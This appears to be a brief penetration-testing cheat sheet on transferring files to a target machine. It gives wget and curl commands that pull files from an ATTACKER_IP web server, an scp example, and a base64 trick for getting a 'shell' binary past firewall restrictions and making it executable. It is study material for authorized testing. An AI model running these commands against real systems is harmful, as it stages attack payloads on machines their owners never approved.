
## 📂 File Transfer in Penetration Testing 

### 1. **Using `wget` or `curl`**

- Start HTTP server locally:
    
    ```bash
    python3 -m http.server 8000
    ```
    
- On target (with wget):
    
    ```bash
    wget http://ATTACKER_IP:8000/file -O file
    ```
    
- On target (with curl):
    
    ```bash
    curl http://ATTACKER_IP:8000/file -o file
    ```
    

---

### 2. **Using `scp`**

(Needs valid SSH credentials)

```bash
scp file user@target:/tmp/file
```

---

### 3. **Using Base64 (firewall restrictions)**

- Encode locally:
    
    ```bash
    base64 -w 0 shell > shell.b64
    ```
    
- Copy/paste to target & decode:
    
    ```bash
    echo <BASE64_STRING> | base64 -d > shell
    chmod +x shell
    ```
    

---

### 4. **Validating File Transfers**

- Check file type:
    
    ```bash
    file shell
    ```
    
- Verify integrity with hash:
    
    - Local: `md5sum shell`
        
    - Remote: `md5sum shell`
        
    - Hashes must match.
        

---

### 🔑 Key Points

- `wget` / `curl` → quick & simple.
    
- `scp` → needs SSH login.
    
- `base64` → bypass network restrictions, copy-paste safe.
    
- Always validate with `file` + `md5sum`.
    

---
